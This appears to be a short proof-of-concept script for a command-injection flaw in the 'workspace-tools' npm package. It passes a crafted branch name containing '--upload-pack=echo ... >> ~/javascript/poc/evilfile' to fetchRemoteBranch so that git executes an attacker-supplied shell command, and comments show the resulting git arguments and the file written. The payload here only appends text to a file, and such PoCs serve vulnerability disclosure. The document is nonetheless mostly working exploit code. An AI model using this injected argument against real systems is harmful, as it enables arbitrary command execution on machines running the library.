const workspace_tools = require("workspace-tools");

workspace_tools.init("./", "username", "password")
let remoteBranch = "--upload-pack=echo 'some malicious code' >> ~/javascript/poc/evilfile";
workspace_tools.fetchRemoteBranch("origin", remoteBranch, "./") 
// git [ "fetch", "origin", "--upload-pack=echo 'some malicious code' >> ~/javascript/poc/evilfile;" ]
// /root/javascript/poc/evilfile
// ~/javascript/poc/evilfile